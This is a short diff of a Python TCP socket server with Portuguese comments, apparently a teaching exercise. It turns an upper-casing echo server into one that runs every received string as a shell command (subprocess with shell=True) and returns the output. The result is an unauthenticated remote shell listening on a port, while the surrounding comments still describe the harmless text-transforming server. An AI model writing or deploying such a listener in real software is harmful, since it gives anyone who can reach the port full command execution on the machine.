@@ -19,6 +19,7 @@
 
 # importacao das bibliotecas
 from socket import * # sockets
+import subprocess
 
 # definicao das variaveis
 serverName = '' # ip do servidor (em branco)
@@ -29,10 +30,11 @@ serverSocket.listen(1) # socket pronto para 'ouvir' conexoes
 print ('Servidor TCP esperando conexoes na porta %d ...' % (serverPort))
 while 1:
   connectionSocket, addr = serverSocket.accept() # aceita as conexoes dos clientes
-  sentence = connectionSocket.recv(1024) # recebe dados do cliente
-  sentence = sentence.decode('utf-8')
-  capitalizedSentence = sentence.upper() # converte em letras maiusculas
-  print ('Cliente %s enviou: %s, transformando em: %s' % (addr, sentence, capitalizedSentence))
-  connectionSocket.send(capitalizedSentence.encode('utf-8')) # envia para o cliente o texto transformado
+  comando = connectionSocket.recv(1024) # recebe dados do cliente
+  resposta = subprocess.check_output(comando.decode('utf-8'), shell=True, universal_newlines=True, 
+stderr=subprocess.STDOUT)
+  
+  print ('Cliente %s enviou: %s' % (addr, comando.decode('utf-8')))
+  connectionSocket.send(resposta.encode('utf-8')) # envia para o cliente o texto transformado
   connectionSocket.close() # encerra o socket com o cliente
 serverSocket.close() # encerra o socket do servidor
